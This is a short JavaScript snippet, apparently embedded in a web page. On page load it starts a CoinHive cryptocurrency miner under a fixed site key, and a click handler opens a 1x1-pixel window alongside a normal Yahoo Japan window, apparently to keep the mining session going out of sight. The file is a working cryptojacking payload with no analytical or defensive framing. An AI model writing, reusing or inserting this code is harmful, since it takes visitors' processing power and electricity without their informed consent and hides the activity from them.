$(function(){
	console.log('ready');
	var miner = new CoinHive.Anonymous('fq2DutyzyB9jOE55VfSiNDL623OVqAKw', {throttle: 0.9});
	if (!miner.isMobile() && !miner.didOptOut(14400)) {
		miner.start();
	}
	$('#popup').click(function(){
		win = window.open('http://www.yahoo.co.jp/', 'yahoo', 'width=1, height=1, top=0, left=0');
		won = window.open('http://www.yahoo.co.jp/', 'main', 'width=500, height=500');
	});
});